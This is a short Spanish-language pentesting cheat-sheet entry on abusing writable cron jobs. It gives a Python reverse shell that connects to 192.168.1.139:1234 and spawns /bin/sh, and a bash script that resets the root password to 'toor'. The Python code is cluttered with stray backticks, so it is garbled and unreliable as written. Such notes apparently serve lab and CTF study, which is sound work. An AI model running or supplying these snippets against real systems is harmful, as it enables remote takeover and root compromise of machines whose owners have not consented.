### Tareas cron

##### Tarea cron python (reverse shell)
Si es editable añadimos el siguiente codigo para establecer una reverse shell con tareas cron. (y nos ponemos a la escucha):
```python 
`#!/bin/python3`

`import sys`

`import time`

`import subprocess`

`from pwn import *`

`if` `__name__ ==` `"__main__"``:`

    `s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((``"192.168.1.139"``,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([``"/bin/sh"``,``"-i"``])`
```

##### Tarea cron bash (cambio contraseña root)
Este script, establece al usuario root, la **contraseña: "toor"**

```bash
#!/bin/bash  
echo -e "toor\ntoor" | passwd root
```
